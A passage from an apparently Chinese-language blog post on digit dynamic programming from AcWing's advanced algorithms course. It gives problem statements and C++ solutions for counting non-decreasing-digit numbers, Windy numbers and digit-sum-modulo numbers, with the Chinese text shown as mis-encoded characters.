src="/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/image-20221212195302995.png" alt></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¡ç®—f[i][j]: iä½ä¸”æœ€é«˜ä½ä¸ºjçš„ä¸é™æ•°ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) f[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">        f[i][j] += f[i - <span class="number">1</span>][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// 0ä¹Ÿæ˜¯ä¸é™ä½æ•°</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = last; j &lt; x; j++) &#123;  <span class="comment">// &lt; å·¦æ”¯å¶åªèƒ½åˆ°a_&#123;n-1&#125;</span></span><br><span class="line">      res += f[i + <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; last) <span class="keyword">break</span>;</span><br><span class="line">    last = x;  <span class="comment">// æ²¿å³èµ°</span></span><br><span class="line">    <span class="keyword">if</span> (!i) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r) == <span class="number">2</span>) &#123;  <span class="comment">// == 2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1083-Windyæ•°"><a href="https://www.acwing.com/problem/content/1085/">AcWing 1083. Windyæ•°</a></h2><p>Windy å®šä¹‰äº†ä¸€ç§ Windy æ•°ï¼šä¸å«å‰å¯¼é›¶ä¸”ç›¸é‚»ä¸¤ä¸ªæ•°å­—ä¹‹å·®è‡³å°‘ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> çš„æ­£æ•´æ•°è¢«ç§°ä¸º Windy æ•°ã€‚</p><p>Windy æƒ³çŸ¥é“ï¼Œåœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> ä¹‹é—´ï¼ŒåŒ…æ‹¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œæ€»å…±æœ‰å¤šå°‘ä¸ª Windy æ•°ï¼Ÿ</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºç­”æ¡ˆã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>A</mi><mo>â‰¤</mo><mi>B</mi><mo>â‰¤</mo><mn>2</mn><mo>Ã—</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le A \le B \le 2 \times 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹1ï¼š</strong></p><pre><code>1 10</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹1ï¼š</strong></p><pre><code>9</code></pre><p><strong>è¾“å…¥æ ·ä¾‹2ï¼š</strong></p><pre><code>25 50</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹2ï¼š</strong></p><pre><code>20</code></pre><h3 id="é¢˜è§£">é¢˜è§£</h3><p>æœ¬é¢˜å‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼š<strong>ä¸èƒ½ä½¿ç”¨å‰å¯¼0</strong></p><p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š014ï¼ˆå³14ï¼‰æŒ‰ç†æ¥è¯´æ˜¯Windyæ•°ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬ç»™ä»–åŠ ä¸Šäº†å‰å¯¼0ï¼Œè¿™æ ·çœ‹ä¸Šå»å°±ä¸æ˜¯Windyæ•°äº†ã€‚</p><p>æ­£ç¡®çš„åšæ³•ï¼šç¬¬ä¸€å±‚å·¦åˆ†æ”¯åªèƒ½å–<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>âˆ¼</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\sim a_{n-1} -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼Œæœ€å<mark>è¿˜è¦åŠ ä¸Šä½æ•°å°‘äºNçš„ä½æ•°çš„æƒ…å†µ</mark>ã€‚(ç¬¬ä¸€ä½å¿…é¡»ä»1å¼€å§‹å–å°±ä¼šé—æ¼ä½æ•°è¾ƒNå°‘çš„æ•°ï¼Œæ¯”å¦‚14)</p><blockquote><p>å½“n = 0æ—¶ï¼Œè™½ç„¶0ä¹Ÿæ˜¯Windyæ•°ï¼Œä½†ä¸ºäº†è¿ç®—æ­£ç¡®ï¼Œæˆ‘ä»¬å¿…é¡»è¿”å›0ï¼š</p><p>æ¯”å¦‚ l = 1, r = 1æ—¶ï¼Œdp(r = 1)å…¶å®åªæœ‰æœ‰1å±‚ï¼Œæœ‰2ä¸ªæ•°ï¼š0å’Œ1, å³è¿”å›2ã€‚<br>æ‰€ä»¥åœ¨å¯ä»¥ä½¿ç”¨å‰å¯¼0çš„æƒ…å†µä¸‹ï¼Œæ ¹æ®å…·ä½“æ„ä¹‰å–ret 1æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™é‡Œret 0çš„è¯, dp(1) - dp(0) = 2å°±ä¸å¯¹äº†</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">11</span>;</span><br><span class="line"><span class="type">int</span> f[kN][<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¡ç®—f[i][j]: iä½, ä¸”æœ€é«˜ä½ä¸ºjçš„Windyæ•°ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) f[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; k++) &#123;</span><br><span class="line">        f[i][j] += (<span class="built_in">abs</span>(j - k) &gt;= <span class="number">2</span>) * f[i - <span class="number">1</span>][k];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 0è™½ç„¶ä¹Ÿæ˜¯Windyæ•°ï¼Œä½†ç”±äºè®¡ç®—æ—¶æ’é™¤å‰å¯¼0, è¿™é‡Œå–0</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % <span class="number">10</span>);</span><br><span class="line">    n /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;</span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = (i == nums.<span class="built_in">size</span>() - <span class="number">1</span>); j &lt; x; j++) &#123;  <span class="comment">// ç¬¬ä¸€å±‚ä»1å¼€å§‹å–</span></span><br><span class="line">      res += (<span class="built_in">abs</span>(j - last) &gt;= <span class="number">2</span>) * f[i + <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">abs</span>(x - last) &lt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">    last = x;</span><br><span class="line">    <span class="keyword">if</span> (!i) res++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;  <span class="comment">// åŠ ä¸Šä½æ•°è¾ƒNå°‘çš„æƒ…å†µ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">      res += f[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1084-æ•°å­—æ¸¸æˆ-II"><a href="https://www.acwing.com/problem/content/1086/">AcWing 1084. æ•°å­—æ¸¸æˆ II</a></h2><p>ç”±äºç§‘åé‡Œæœ€è¿‘çœŸçš„å¾ˆæµè¡Œæ•°å­—æ¸¸æˆã€‚</p><p>æŸäººåˆå‘½åäº†ä¸€ç§å–æ¨¡æ•°ï¼Œè¿™ç§æ•°å­—å¿…é¡»æ»¡è¶³å„ä½æ•°å­—ä¹‹å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mtext>Â </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">mod\ N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">Â </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ã€‚</p><p>ç°åœ¨å¤§å®¶åˆè¦ç©æ¸¸æˆäº†ï¼ŒæŒ‡å®šä¸€ä¸ªæ•´æ•°é—­åŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mi mathvariant="normal">.</mi><mi>b</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a.b]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mord">.</span><span class="mord mathnormal">b</span><span class="mclose">]</span></span></span></span>ï¼Œé—®è¿™ä¸ªåŒºé—´å†…æœ‰å¤šå°‘ä¸ªå–æ¨¡æ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„æ•°æ®å ä¸€è¡Œã€‚</p><p>æ¯ç»„æ•°æ®åŒ…å«ä¸‰ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">a,b,N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å¯¹äºæ¯ä¸ªæµ‹è¯•æ•°æ®è¾“å‡ºä¸€è¡Œç»“æœï¼Œè¡¨ç¤ºåŒºé—´å†…å„ä½æ•°å­—å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mtext>Â </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">mod\ N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">Â </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> çš„æ•°çš„ä¸ªæ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>â‰¤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \le a,b \le 2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>&lt;</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">1 \le N &lt; 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1 19 9</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>2</code></pre><h3 id="é¢˜è§£-2">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">11</span>, kM = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> N;</span><br><span class="line"><span class="type">int</span> f[kN][<span class="number">10</span>][kM];</span><br><span class="line"></span><br><span class="line"><span class="comment">// cppçš„å–æ¨¡è¿ç®—ä¸pyç­‰ä¸åŒ, cppä¸­-1 % 3 = -2</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mod</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x % y + y) % y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¡ç®—f[i][j][k]: iä½, æœ€é«˜ä½ä¸ºj, 